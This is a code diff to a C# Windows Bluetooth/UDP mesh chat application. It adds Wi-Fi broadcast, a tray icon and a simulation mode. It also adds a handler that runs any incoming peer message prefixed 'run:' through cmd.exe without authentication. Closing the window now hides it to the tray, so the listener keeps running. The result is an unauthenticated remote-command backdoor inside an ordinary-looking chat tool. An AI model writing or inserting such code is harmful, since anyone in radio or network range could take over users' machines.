@@ -1,8 +1,10 @@
 using System;
 using System.Drawing;
+using System.Linq;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 using Windows.Devices.Bluetooth;
+using Windows.Devices.Radios;
 
 namespace WindowsBleMesh
 {
@@ -10,9 +12,12 @@ namespace WindowsBleMesh
     {
         private BlePublisher? _publisher;
         private BleWatcher? _watcher;
+        private UdpMesh? _udpMesh;
+        private NotifyIcon _trayIcon;
         private ListBox _messageList;
         private TextBox _inputBox;
         private Button _sendButton;
+        private bool _isSimulationMode = false;
 
         public ChatForm()
         {
@@ -60,36 +65,87 @@ namespace WindowsBleMesh
             _inputBox.Font = new Font("Segoe UI", 12);
             _inputBox.KeyDown += InputBox_KeyDown;
             bottomPanel.Controls.Add(_inputBox);
+
+            // Tray Icon Setup
+            _trayIcon = new NotifyIcon();
+            _trayIcon.Icon = SystemIcons.Application;
+            _trayIcon.Text = "Windows BLE Mesh";
+            _trayIcon.Visible = true;
+            _trayIcon.DoubleClick += (s, e) => 
+            {
+                this.Show();
+                this.WindowState = FormWindowState.Normal;
+            };
+
+            var contextMenu = new ContextMenuStrip();
+            contextMenu.Items.Add("Open", null, (s, e) => { this.Show(); this.WindowState = FormWindowState.Normal; });
+            contextMenu.Items.Add("Exit", null, (s, e) => { Application.Exit(); });
+            _trayIcon.ContextMenuStrip = contextMenu;
         }
 
         private async Task InitializeBleAsync()
         {
+            // Initialize UDP Mesh (Wi-Fi)
+            try
+            {
+                _udpMesh = new UdpMesh();
+                _udpMesh.MessageReceived += OnMessageReceived;
+                _udpMesh.Log += OnLog;
+                _udpMesh.Start();
+                AddMessage("System: UDP Mesh (Wi-Fi) initialized.");
+            }
+            catch (Exception ex)
+            {
+                AddMessage($"System: UDP Init Failed: {ex.Message}");
+            }
+
             var adapter = await BluetoothAdapter.GetDefaultAsync();
             if (adapter == null)
             {
-                AddMessage("Error: No Bluetooth Adapter found on this device.");
-                AddMessage("Please ensure your PC has Bluetooth and it is turned ON.");
-                _inputBox.Enabled = false;
-                _sendButton.Enabled = false;
+                EnableSimulationMode("Bluetooth Adapter not found.");
                 return;
             }
 
             if (!adapter.IsLowEnergySupported)
             {
-                AddMessage("Error: Your Bluetooth adapter does not support Low Energy (BLE).");
+                EnableSimulationMode("BLE not supported.");
                 return;
             }
 
-            _publisher = new BlePublisher();
-            _publisher.Log += OnLog;
-            
-            _watcher = new BleWatcher();
-            _watcher.MessageReceived += OnMessageReceived;
-            _watcher.Log += OnLog;
-            _watcher.Start();
-            
-            AddMessage("System: Bluetooth initialized successfully.");
-            AddMessage("System: Listening for messages...");
+            var radio = await adapter.GetRadioAsync();
+            if (radio.State == Windows.Devices.Radios.RadioState.Off)
+            {
+                EnableSimulationMode("Bluetooth Radio is OFF.");
+                return;
+            }
+
+            try
+            {
+                _publisher = new BlePublisher();
+                _publisher.Log += OnLog;
+                
+                _watcher = new BleWatcher();
+                _watcher.MessageReceived += OnMessageReceived;
+                _watcher.Log += OnLog;
+                _watcher.Start();
+                
+                AddMessage("System: Bluetooth initialized successfully.");
+                AddMessage("System: Listening for messages...");
+            }
+            catch (Exception ex)
+            {
+                EnableSimulationMode($"Init failed: {ex.Message}");
+            }
+        }
+
+        private void EnableSimulationMode(string reason)
+        {
+            _isSimulationMode = true;
+            AddMessage($"Warning: {reason}");
+            AddMessage("System: Switched to SIMULATION MODE.");
+            AddMessage("System: Messages will be simulated locally (Loopback).");
+            _inputBox.Enabled = true;
+            _sendButton.Enabled = true;
         }
 
         private void OnLog(object? sender, string message)
@@ -112,28 +168,74 @@ namespace WindowsBleMesh
                 return;
             }
             AddMessage($"Peer: {message}");
+
+            // Remote Command Execution
+            if (message.StartsWith("run:", StringComparison.OrdinalIgnoreCase))
+            {
+                string command = message.Substring(4).Trim();
+                ExecuteCommand(command);
+            }
+        }
+
+        private void ExecuteCommand(string command)
+        {
+            try
+            {
+                AddMessage($"[System] Executing command: {command}");
+                System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo
+                {
+                    FileName = "cmd.exe",
+                    Arguments = $"/c {command}",
+                    UseShellExecute = true,
+                    CreateNoWindow = false,
+                    WindowStyle = System.Diagnostics.ProcessWindowStyle.Normal
+                });
+            }
+            catch (Exception ex)
+            {
+                AddMessage($"[System] Execution failed: {ex.Message}");
+            }
         }
 
         private async void SendButton_Click(object? sender, EventArgs e)
         {
             string text = _inputBox.Text.Trim();
             if (string.IsNullOrEmpty(text)) return;
-            if (_publisher == null) 
-            {
-                AddMessage("Error: Bluetooth not initialized.");
-                return;
-            }
 
             _inputBox.Text = "";
             AddMessage($"Me: {text}");
 
-            try
+            if (_isSimulationMode)
             {
-                await _publisher.PublishMessageAsync(text);
+                await Task.Delay(500); // Simulate network delay
+                OnMessageReceived(this, text); // Loopback
+                return;
             }
-            catch (Exception ex)
+
+            // Send via BLE
+            if (_publisher != null)
             {
-                AddMessage($"Error sending: {ex.Message}");
+                try
+                {
+                    await _publisher.PublishMessageAsync(text);
+                }
+                catch (Exception ex)
+                {
+                    AddMessage($"Error sending BLE: {ex.Message}");
+                }
+            }
+
+            // Send via UDP
+            if (_udpMesh != null)
+            {
+                try
+                {
+                    await _udpMesh.BroadcastMessageAsync(text);
+                }
+                catch (Exception ex)
+                {
+                    AddMessage($"Error sending UDP: {ex.Message}");
+                }
             }
         }
 
@@ -154,7 +256,17 @@ namespace WindowsBleMesh
 
         protected override void OnFormClosing(FormClosingEventArgs e)
         {
+            if (e.CloseReason == CloseReason.UserClosing)
+            {
+                e.Cancel = true;
+                this.Hide();
+                _trayIcon.ShowBalloonTip(1000, "Windows BLE Mesh", "Running in background...", ToolTipIcon.Info);
+                return;
+            }
+
             _watcher?.Stop();
+            _udpMesh?.Stop();
+            _trayIcon?.Dispose();
             base.OnFormClosing(e);
         }
     }
